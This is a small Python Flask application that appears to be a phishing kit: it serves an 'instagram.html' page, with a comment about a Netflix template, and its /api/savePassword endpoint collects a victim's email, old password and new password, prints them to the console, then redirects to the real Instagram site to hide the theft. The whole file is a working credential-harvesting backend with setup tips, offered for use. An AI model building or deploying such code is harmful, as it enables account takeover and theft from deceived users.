from flask import Flask, render_template, request, jsonify, redirect

app = Flask(__name__)
#DEFAULT NETFLIX TEMPLATE
@app.route('/')
def index():
    #create a sub folder named template and move ur custom_template into that folder then only it will work 
    return render_template('instagram.html')

@app.route('/api/savePassword', methods=['POST'])
def save_password():
    old_password = request.form.get('oldpassword')
    new_password = request.form.get('password')
    emailaddr = request.form.get("email")
    if old_password and new_password:
        try:
            # Print the passwords to the console
            print(f"Received email: {emailaddr}")
            print(f"Received old password: {old_password}")
            print(f"Received new password: {new_password}")
            return redirect("https://instagram.com")  # Indentation corrected
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    else:
        return jsonify({'error': 'Missing password fields'}), 400

if __name__ == '__main__':
    app.run(debug=True, port=4000)
